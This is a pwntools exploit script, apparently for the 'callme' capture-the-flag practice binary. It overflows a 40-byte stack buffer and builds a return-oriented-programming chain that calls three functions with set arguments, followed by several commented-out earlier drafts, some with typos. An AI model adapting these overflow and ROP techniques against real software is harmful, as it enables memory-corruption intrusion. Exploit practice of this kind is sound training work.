from pwn import *

exe = context.binary = ELF('callme')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *pwnme+89
continue
'''.format(**locals())

# -- Exploit goes here --

pop_rdi_rsi_rdx = 0x000000000040093c
ret = 0x00000000004006be

# params = [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d]
# rop = ROP(exe)
# rop.callme_one(*params)
# rop.callme_two(*params)
# rop.callme_three(*params)

# print(rop.dump())
print("type returned by exe.sym.callme_one is :"+str(type(exe.sym.callme_one)))
print(p64(ret))
print(type(p64(ret)))

pay = b'\x90' * 40
pay += p64(ret)
# pay += rop.chain()
pay += p64(pop_rdi_rsi_rdx)
pay += p64(0xdeadbeefdeadbeef)
pay += p64(0xcafebabecafebabe)
pay += p64(0xd00df00dd00df00d)
pay += p64(exe.sym.callme_one)

pay += p64(pop_rdi_rsi_rdx)
pay += p64(0xdeadbeefdeadbeef)
pay += p64(0xcafebabecafebabe)
pay += p64(0xd00df00dd00df00d)
pay += p64(exe.sym.callme_two)


pay += p64(pop_rdi_rsi_rdx)
pay += p64(0xdeadbeefdeadbeef)
pay += p64(0xcafebabecafebabe)
pay += p64(0xd00df00dd00df00d)
pay += p64(exe.sym.callme_three)

# io = start()
p = process()

p.sendlineafter(b'> ', pay)
p.interactive()

##################################################################################################
# # # # from pwn import *

# # # # elf = context.binary = ELF("./callme",checksec=False)
# # # # p = process()

# # # # offset = 40

# # # # p1 = 0xdeadbeefdeadbeef
# # # # p2 = 0xcafebabecafebabe
# # # # p3 = 0xd00df00dd00df00d
# # # # pop_gadget = 0x000000000040093c
# # # # callmeone = 0x0040092d
# # # # callmetwo = 0x00400919
# # # # callmethree = 0x00400905

# # # # payload = b'A' * 40
# # # # payload += p64(pop_gadget)
# # # # payload += p64(p1)
# # # # payload += p64(p2)
# # # # payload += p64(p3)
# # # # payload += p64(callmeone)

# # # # payload += p64(pop_gadget)
# # # # payload += p64(p1)
# # # # payload += p64(p2)
# # # # payload += p64(p3)
# # # # payload += p64(callmetwo)

# # # # payload += p64(pop_gadget)
# # # # payload += p64(p1)
# # # # payload += p64(p2)
# # # # payload += p64(p3)
# # # # payload += p64(callmethree)

# # # # print(payload)
# # # # log.info(p.clean())
# # # # p.sendline(payload)
# # # # p.interactive
# # # # # p.sendlineafter('>',payload)
# # # # # flag = p.recv()
# # # # # print(flag)
# # # # log.info(p.clean())


# # # # # rop = ROP(elf)

# # # # # params = [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d]

# # # # # rop.callme_one(*params)
# # # # # rop.callme_two(*params)
# # # # # rop.callme_three(*params)

# # # # # rop_chain = rop.chain()
# # # # # info("rop chain here:%r", rop_chain)

# # # # # payload = flat(
# # # # #     asm('nop') * offset,
# # # # #     rop_chain
# # # # # )

# # # # # p.sendlineafter('>', payload)
# # # # # p.recvuntil("Thank you!\n")

# # # # # flag = p.recv()
# # # # # success(flag)
# # # from pwn import *

# # # elf = ELF('./callme')                             #context.binary

# # # p = process(elf.path)

# # # #Prepare the payload
# # # junk = b"A"*40                                  #creates the junk part of the payload
# # # arg0 = struct.pack("Q",0xdeadbeefdeadbeef)                  
# # # arg1 = struct,pack("Q",0xcafebabecafebabe)                  
# # # arg2 = struct.pack("Q",0xd00df00dd00df00d)                  

# # # # callme_one = p64(0x400720)                      #address of callme_one
# # # # callme_two = p64(0x400740)                      #address of callme_two
# # # # callme_three = p64(0x4006f0)                    #address of callme_three  
# # # callme_one = struct.pack("Q",0x0040092d)
# # # callme_two = struct,pack("Q",0x00400919)
# # # callme_three = struct.pack("Q",0x00400905)

# # # # pop_rdi_rsi_rdx_ret = p64(0x40093c)             #address of pop rdi ; pop rsi ; pop rdx ; ret
# # # pop_rdi_rsi_rdx_ret = struct.pack("Q",0x000000000040093c)

# # # get_args = pop_rdi_rsi_rdx_ret + arg0 + arg1 + arg2

# # # payload = junk + get_args + callme_one + get_args + callme_two + get_args + callme_three

# # # # Send the payload

# # # p.sendline(payload)                             #send the payload to the process

# # # response = p.recvall()                          #gets all messages in the process

# # # print(response.decode())
# # # #print(re.search("(ROPE{.*?})",response.decode()))
# # from pwn import *

# # def start(argv=[], *a, **kw):
# #     # Start the exploit against the target
# #     if args.GDB:
# #         return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
# #     else:
# #         return process([exe] + argv, *a, **kw)


# # exe = "./callme"
# # elf = context.binary = ELF(exe,checksec=False)
# # context.log_level = "info"
# # context.delete_corefiles = True
# # offset = 40

# # callme_one = 0x0040092d
# # callme_two = 0x00400919
# # callme_three = 0x00400905
# # pop3 = 0x000000000040093c

# # payload = flat(
# #     asm('nop') * offset,
# #     pop3,
# #     0xdeadbeefdeadbeef,
# #     0xcafebabecafebabe,
# #     0xd00df00dd00df00d,
# #     callme_one,
# #     pop3,
# #     0xdeadbeefdeadbeef,
# #     0xcafebabecafebabe,
# #     0xd00df00dd00df00d,
# #     callme_two,
# #     pop3,
# #     0xdeadbeefdeadbeef,
# #     0xcafebabecafebabe,
# #     0xd00df00dd00df00d,
# #     callme_three
# # )

# # p = process()
# # p.sendlineafter('>', payload)
# # p.recvuntil("Thank you!\n")
# # success(p.recv())
# from pwn import *

# # Many built-in settings can be controlled via CLI and show up in "args"
# # For example, to dump all data sent/received, and disable ASLR
# # ./exploit.py DEBUG NOASLR


# def start(argv=[], *a, **kw):
#     # Start the exploit against the target
#     if args.GDB:
#         return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
#     else:
#         return process([exe] + argv, *a, **kw)


# # Specify your GDB script here for debugging
# gdbscript = '''
# init-peda
# continue
# '''.format(**locals())

# # Set up pwntools for the correct architecture
# exe = './callme'
# # This will automatically get context arch, bits, os etc
# elf = context.binary = ELF(exe, checksec=False)
# # Enable verbose logging so we can see exactly what is being sent (info/debug)
# context.log_level = 'info'
# # Delete core files after finished
# # context.delete_corefiles = True

# # ===========================================================
# #                    EXPLOIT GOES HERE
# # ===========================================================

# io = start()

# # Locate the functions/strings we need
# callme_one = elf.symbols['callme_one']
# callme_two = elf.symbols['callme_two']
# callme_three = elf.symbols['callme_three']

# # Print out the target address
# info("%#x callme_one", callme_one)
# info("%#x callme_two", callme_two)
# info("%#x callme_three", callme_three)

# # We will send a 'cyclic' pattern which overwrites the return address on the stack
# payload = cyclic(100)

# # PWN
# io.sendlineafter('>', payload)

# # Wait for the process to crash
# io.wait()

# # Open up the corefile
# core = io.corefile

# # Print out the address of RSP at the time of crashing (SP for ARM)
# stack = core.rsp
# info("%#x stack", stack)

# # Read four bytes from RSP, which will be some of our cyclic data.
# # With this snippet of the pattern, we know the exact offset from
# # the beginning of our controlled data to the return address.
# pattern = core.read(stack, 4)
# offset = cyclic_find(pattern)
# info("%r pattern (offset: %r)", pattern, offset)

# # ROP
# rop = ROP(elf)  # Load rop gadgets
# print(rop.dump())
# # pprint(rop.gadgets)

# # Address needed to put parameters in registers
# pop3 = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"])[0]
# info("%#x pop rdi; pop rsi; pop rdx; ret;", pop3)

# # Craft a new payload which puts the "target" address at the correct offset
# payload = flat(
#     asm('nop') * offset,
#     pop3,
#     0xdeadbeefdeadbeef,
#     0xcafebabecafebabe,
#     0xd00df00dd00df00d,
#     callme_one,
#     pop3,
#     0xdeadbeefdeadbeef,
#     0xcafebabecafebabe,
#     0xd00df00dd00df00d,
#     callme_two,
#     pop3,
#     0xdeadbeefdeadbeef,
#     0xcafebabecafebabe,
#     0xd00df00dd00df00d,
#     callme_three
# )

# # Send the payload to a new copy of the process
# io = start()
# io.sendlineafter('>', payload)
# io.recvuntil('Thank you!\n')

# # Get our flag!
# flag = io.recv()
# success(flag)
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

